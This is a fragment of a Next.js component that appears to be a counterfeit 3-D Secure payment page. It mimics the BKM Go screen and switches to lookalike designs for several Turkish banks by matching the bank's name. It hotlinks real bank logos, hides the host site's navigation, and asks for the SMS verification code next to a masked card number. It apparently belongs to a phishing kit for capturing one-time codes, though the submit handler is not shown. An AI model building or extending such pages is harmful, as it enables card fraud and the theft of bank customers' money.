                <style jsx global>{`
                    nav.fixed.bottom-0 { display: none !important; }
                    main { padding-bottom: 0 !important; }
                    header { display: none !important; }
                `}</style>

                <div className="content-wrapper" style={{ margin: '0 auto', maxWidth: '480px' }}>
                    <div className="header" style={{ marginTop: '25px', display: 'flex', justifyContent: 'space-between', alignContent: 'center', alignItems: 'center', padding: '0 10px' }}>
                        <div className="brand-logo" style={{ margin: 0 }}>
                            {/* eslint-disable-next-line @next/next/no-img-element */}
                            <img src="https://goguvenliodeme.bkm.com.tr/images/go.png" alt="GO" style={{ height: '35px', objectFit: 'contain' }} />
                        </div>
                        <div>
                            {/* eslint-disable-next-line @next/next/no-img-element */}
                            <img src={logoUrl} alt="Bank Logo" style={{ height: '35px', objectFit: 'contain', maxWidth: '140px' }} onError={(e) => {
                                (e.target as HTMLImageElement).src = "/api/csfour-proxy/staticimage/carrefoursacom-logo.svg";
                            }} />
                        </div>
                    </div>

                    <div id="approve-page">
                        {isSubmitting && (
                            <div id="loaderDiv" style={{ height: '100%', width: '100%', position: 'absolute', zIndex: 1, display: 'flex' }}>
                                <div className="loader"></div>
                            </div>
                        )}

                        <div className="content">
                            <div className="info-wrapper">
                                <div className="info-row">
                                    <div className="info-col info-label">İşyeri Adı:</div>
                                    <div className="info-col" id="merchant-name">{data?.isyeriAdi}</div>
                                </div>
                                <div className="info-row">
                                    <div className="info-col info-label">İşlem Tutarı:</div>
                                    <div className="info-col amount" id="amount">{data?.tutar} ₺</div>
                                </div>
                                <div className="info-row">
                                    <div className="info-col info-label">İşlem Tarihi-Saati:</div>
                                    <div className="info-col" id="operation-date-time">{data?.tarih || ''}</div>
                                </div>
                                <div className="info-row">
                                    <div className="info-col info-label">Kart Numarası:</div>
                                    <div className="info-col" id="pan">XXXX XXXX XXXX {data?.lastFourDigits}</div>
                                </div>
                            </div>

                            <div className="action-wrapper">
                                <div>
                                    <h3>
                                        Şifreniz <span id="msisdn">{data?.maskedPhone}</span> nolu cep telefonunuza gönderilecektir.
                                        <br />Referans no: {referansNo}
                                    </h3>
                                </div>

                                <div className="form-wrapper">
                                    <form id="bkmform" className="form-code" onSubmit={handleSubmit} autoComplete="off">
                                        {error && <div className="text-danger mb-2" style={{ fontSize: '13px' }}>{error}</div>}
                                        <div className="form-row">
                                            <label htmlFor="code" className="otpcode">Doğrulama Kodu</label>
                                            <input
                                                ref={inputRef}
                                                type="tel"
                                                className={`f-input ${error ? 'error' : ''}`}
                                                name="otpCode"
                                                id="passwordfield"
                                                minLength={5}
                                                maxLength={6}
                                                value={smsCode}
                                                onChange={(e) => {
                                                    const val = e.target.value.replace(/\D/g, '').slice(0, 6);
                                                    setSmsCode(val);
                                                    setError('');
                                                }}
                                                placeholder=""
                                                inputMode="numeric"
                                                pattern="[0-9]*"
                                                autoComplete="one-time-code"
                                                disabled={isTimeout}
                                            />
                                        </div>

                                        {isTimeout ? (
                                            <div id="timeOutDiv" className="error-messages error-timeover" style={{ display: 'block' }}>
                                                <div>
                                                    <span className="has-reg">Doğrulama Kodunu belirtilen süre içerisinde girmediniz.</span>
                                                </div>
                                                <button
                                                    type="button"
                                                    onClick={handleRetry}
                                                    className="button btn-1 re-code v1"
                                                >
                                                    Doğrulama Kodunu Yeniden Gönder
                                                </button>
                                            </div>
                                        ) : (
                                            <div id="submitButtonDiv" style={{ display: 'block' }}>
                                                <div className="has-submit">
                                                    <button
                                                        id="submitbutton"
                                                        type="submit"
                                                        className="button btn-1 btn-commit"
                                                        disabled={isSubmitting || smsCode.length < 5}
                                                    >
                                                        Onayla
                                                    </button>
                                                </div>
                                                <div id="timerDiv" className="has-timer">
                                                    <span>Kalan Süre: </span>
                                                    <span className="has-counter" id="has-counter">{formatTime(timeLeft)}</span>
                                                </div>
                                            </div>
                                        )}

                                        <div className="call-to-action">
                                            <ul className="action-list">
                                                <li>
                                                    <button
                                                        type="button"
                                                        onClick={handleCancel}
                                                        className="txt-link"
                                                        style={{ background: 'none', border: 'none', cursor: 'pointer', fontFamily: 'inherit' }}
                                                    >
                                                        İşlemi İptal Et
                                                    </button>
                                                </li>
                                            </ul>
                                        </div>
                                    </form>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </>
        );
    };

    // Banka adına göre render yöntemini belirle
    if (bank.includes('garanti') || bank.includes('bonus')) {
        return renderGaranti();
    }
    if (bank.includes('akbank') || bank.includes('axess')) {
        return renderAkbank();
    }
    if (bank.includes('deniz')) {
        return renderDenizbank();
    }
    if (bank.includes('finans') || bank.includes('qnb')) {
        return renderFinansbank();
    }
    if (bank.includes('isbank') || bank.includes('işbank') || bank.includes('maximum')) {
        return renderIsbankasi();
    }

    // Varsayılan BKM Go tasarımı ve banka logoları eşleşmesi
    let bankLogo = 'https://goguvenliodeme.bkm.com.tr/images/go.png';
    if (bank.includes('ziraat')) {
        bankLogo = 'https://goguvenliodeme.bkm.com.tr/banklogo/ziraatbankasi.png';
    } else if (bank.includes('vakif') || bank.includes('vakıf')) {
        bankLogo = 'https://goguvenliodeme.bkm.com.tr/banklogo/vakifbank.png';
    } else if (bank.includes('halk')) {
        bankLogo = 'https://goguvenliodeme.bkm.com.tr/banklogo/halkbank.png';
    } else if (bank.includes('ing')) {
        bankLogo = 'https://goguvenliodeme.bkm.com.tr/banklogo/ing.png';
    } else if (bank.includes('yapi') || bank.includes('yapı') || bank.includes('world') || bank.includes('ykb')) {
        bankLogo = 'https://goguvenliodeme.bkm.com.tr/banklogo/yapikredi.png';
    } else if (bank.includes('teb')) {
        bankLogo = 'https://goguvenliodeme.bkm.com.tr/banklogo/teb.png';
    } else if (bank.includes('şeker') || bank.includes('seker')) {
        bankLogo = 'https://goguvenliodeme.bkm.com.tr/banklogo/sekerbank.png';
    } else if (bank.includes('hsbc')) {
        bankLogo = 'https://goguvenliodeme.bkm.com.tr/banklogo/hsbc.png';
    } else if (bank.includes('odea')) {
        bankLogo = 'https://goguvenliodeme.bkm.com.tr/banklogo/odeabank.png';
    } else if (bank.includes('albaraka')) {
        bankLogo = 'https://goguvenliodeme.bkm.com.tr/banklogo/albaraka.png';
    } else if (bank.includes('kuveyt')) {
        bankLogo = 'https://goguvenliodeme.bkm.com.tr/banklogo/kuveytturk.png';
    } else if (bank.includes('turkiye finans') || bank.includes('türkiye finans')) {
        bankLogo = 'https://goguvenliodeme.bkm.com.tr/banklogo/turkiyefinans.png';
    }

    return renderBkmGo(bankLogo);
}
